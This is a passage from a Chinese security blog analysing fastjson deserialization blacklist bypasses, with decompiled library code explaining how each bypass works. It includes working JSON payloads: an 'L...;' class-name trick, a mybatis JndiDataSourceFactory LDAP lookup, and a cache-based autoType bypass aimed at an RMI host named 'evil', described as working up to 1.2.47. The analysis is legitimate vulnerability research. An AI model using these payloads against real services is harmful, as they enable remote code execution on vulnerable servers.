   }</code></pre><p><code>TypeUtils.loadClass</code> 这个方法就比较眼熟了，在fastjson上一个漏洞的分析时讲到过</p><p>来看下重要部分的代码</p><pre><code> Class&lt;?&gt; clazz = (Class)mappings.get(className);
 if (clazz != null) {
    return clazz;
 } else if (className.charAt(0) == '[') {
    Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
 } else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
 }
</code></pre><ul><li>第三个if判断<br>判断雷鸣如果开头是 <code>L</code> 结尾是<code>;</code> 就把头和尾的最后一个字符串截取出来加载</li></ul><p>现在针对 1.2.25 - 1.2.42 可以使用如下方法绕过</p><blockquote><p>Lcom.sun.rowset.JdbcRowSetImpl;<br>LLLcom.sun.rowset.JdbcRowSetImpl;;;</p></blockquote><p>因为它会递归的去判断类名是否包含 L 和 ; 所以可以一直延长</p><p>另外，自 1.2.42 起， fastjson 黑名单由一串字符串变成了 long 数字</p><p><strong>1.2.42</strong></p><pre><code>this.denyHashCodes = new long[]{-8720046426850100497L, -8109300701639721088L, -7966123100503199569L, -7766605818834748097L, -6835437086156813536L, -4837536971810737970L, -4082057040235125754L, -2364987994247679115L, -1872417015366588117L, -254670111376247151L, -190281065685395680L, 33238344207745342L, 313864100207897507L, 1203232727967308606L, 1502845958873959152L, 3547627781654598988L, 3730752432285826863L, 3794316665763266033L, 4147696707147271408L, 5347909877633654828L, 5450448828334921485L, 5751393439502795295L, 5944107969236155580L, 6742705432718011780L, 7179336928365889465L, 7442624256860549330L, 8838294710098435315L};</code></pre><p>还有另一个黑名单绕过方法，范围在 1.2.42-1.2.45。</p><pre><code>{
        &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
        &quot;properties&quot;:{
            &quot;data_source&quot;:&quot;ldap://127.0.0.1:1090/Evil&quot;
        }
}</code></pre><p><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code> 这个类是 mybatis 的类，需要 mybatis 依赖，原理同 <code>JdbcRowSetImple</code></p><p>以上皆为铺垫，现在才是关于这个漏洞正文。</p><h4>复现</h4><p>先上 payload</p><pre><code>{
    &quot;name&quot;:{
        &quot;@type&quot;:&quot;java.lang.Class&quot;,
        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
    },
    &quot;f&quot;:{
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;rmi://10.165.93.31:1090/evil&quot;,
        &quot;autoCommit&quot;:&quot;true&quot;
    }
}</code></pre><p>在 1.2.47 范围内通杀，在此不做演示</p><h4>分析</h4><p>从 payload 来看，实际上就是反序列化了两个对象</p><p>至于为什么可以绕过黑名单和 autoType，看接下来的代码分析</p><p>fastjson 首先会去解析第一个 JSON 对象</p><pre><code>{
    &quot;@type&quot;:&quot;java.lang.Class&quot;,
    &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
}</code></pre><p>取出 @type 的值 <code>java.lang.Class</code> 进入 <code>checkAutoType</code> 方法</p><p>java.lang.Class 不在黑名单里，检查可以顺利通过</p><pre><code>ObjectDeserializer deserializer = this.config.getDeserializer(clazz);</code></pre><p>在取 ObjectDeserializer 对象的时候，由于在 ParserConfig 类的 deserializers Map属性里在初始化的时候对 <code>Class.class</code> 指定了所使用的处理类</p><pre><code>this.deserializers.put(Class.class, MiscCodec.instance);</code></pre><p>所以最终应进入 <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 方法开始序列化对象</p><pre><code>obj = deserializer.deserialze(this, clazz, fieldName);</code></pre><p>来看一个代码片段</p><pre><code>//..
if (clazz == Class.class) {
 return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
}
//...                        </code></pre><p>在 deserialze 方法里取出了 val 的值，也就是<code>com.sun.rowset.JdbcRowSetImpl</code></p><p>交给了 <code>TypeUtils.loadClass</code> 处理</p><pre><code>    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
        if (className != null &amp;&amp; className.length() != 0) {
            Class&lt;?&gt; clazz = (Class)mappings.get(className);
            if (clazz != null) {
                return clazz;
            } else if (className.charAt(0) == '[') {
                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
                return Array.newInstance(componentType, 0).getClass();
            } else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
            } else {
                try {
                    if (classLoader != null) {
                        clazz = classLoader.loadClass(className);
                        if (cache) {
                            mappings.put(className, clazz);
                        }

                        return clazz;
                    }
                } catch (Throwable var7) {
                    var7.printStackTrace();
                }

                try {
                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
                    if (contextClassLoader != null &amp;&amp; contextClassLoader != classLoader) {
                        clazz = contextClassLoader.loadClass(className);
                        if (cache) {
                            mappings.put(className, clazz);
                        }

                        return clazz;
                    }
                } catch (Throwable var6) {
                    ;
                }

                try {
                    clazz = Class.forName(className);
                    mappings.put(className, clazz);
                    return clazz;
                } catch (Throwable var5) {
                    return clazz;
                }
            }
        } else {
            return null;
        }
    }</code></pre><p>这个方法不用我再多说，它会对传过来的类名字符串在mappings找对应的缓存类对象<br>如果没有就加载一个类对象，并添加到 mappings 缓存起来</p><p>至此第一个 JSON 对象解析完毕。</p><p>开始分析第二个 JSON 对象的解析过程</p><pre><code>{
    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
    &quot;dataSourceName&quot;:&quot;rmi://10.165.93.31:1090/evil&quot;,
    &quot;autoCommit&quot;:&quot;true&quot;
}</code></pre><p>理论上来讲，这个类应该是会被黑名单ban掉的。</p><p>再回顾一下 checkAutoType 都做了些什么</p><pre><code>    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
        if (typeName == null) {
            return null;
        } else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) {
            String className = typeName.replace('$', '.');
            Class&lt;?&gt; clazz = null;
            long BASIC = -3750763034362895579L;
            long PRIME = 1099511628211L;
            long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
            if (h1 == -5808493101479473382L) {
                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
            } else if ((h1 ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
            } else {
                long h3 = (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L ^ (long)className.charAt(2)) * 1099511628211L;
                long hash;
                int i;
                if (this.autoTypeSupport || expectClass != null) {
                    //...省略
                }

                if (clazz == null) {
                    clazz = TypeUtils.getClassFromMapping(typeName);    // 重要的在这一步
                }

                if (clazz == null) {
                    clazz = this.deserializers.findClass(typeName);
                }

                if (clazz != null) {
                    if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                    } else {
                        return clazz;
                    }
                }
            //...省略</code></pre><p>这里第一步就去调用了 <code>TypeUtils.getClassFromMapping()</code> 方法去获取类对象</p><pre><code>    public static Class&lt;?&gt; getClassFromMapping(String className) {
        return (Class)mappings.get(className);
    }</code></pre><p>实际上就是从 mappings 里拿缓存起来的类对象，由于刚才解析第一个对象的时候已经把 <code>JdbcRowSetImpl</code> 对象再mappings里缓存了起来</p><p>所以这里直接获取到了 <code>JdbcRowSetImple.class</code> 略过了后面的黑名单审查</p>        </div>
    </article>

    <div id="comments">
        
        <div id="respond-post-184" class="respond">
    
        <h3 id="response" class="comments-title">发表留言</h3>

        <form method="post" action="https://b1ue.cn/archives/184.html/comment" id="comment-form" class="responsesForm" role="form">
            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
                        <p  class="comment-form-author comment-form-input">
                <label for="author">称呼</label>
                <input type="text" name="author" id="author" class="inputGroup" value="" required />
            </p>
            <p  class="comment-form-email comment-form-input">
                <label for="mail">Email</label>
                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
            </p>
            <p  class="comment-form-url comment-form-input">
                <label for="url">网站</label>
                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
            </p>
                        <p class="comment-form-comment comment-form-input">
                <label for="textarea">内容</label>
                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
            </p>
            <p class="form-submit">
                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/184.html#respond-post-184" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
        </form>
    </div>
    </div>



</div><!-- end #main-->


<footer class="footer--empty"></footer>
  </div> <!-- 对应site-main surface-container -->
<div class="loadingBar"></div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
if(l<=0){
    $("pre code").each(function(){
        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
    });
  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
    <script data-no-instant>
		InstantClick.on('change', function(isInitialLoad) {
			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
						jQuery(document).ready(function () {
				$.lately({
					'target' : '.lately-a,.lately-b,.lately-c'
				});
				jQuery.viewImage({
				'target' : '.view-image img', //需要使用ViewImage的图片
				'exclude': '.exclude img',    //要排除的图片
				'delay'  : 300                //延迟时间
				});
			});
		});
		InstantClick.init('mousedown');
    </script>
		
		<script>
	(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();	</script>
	
</body>
</html>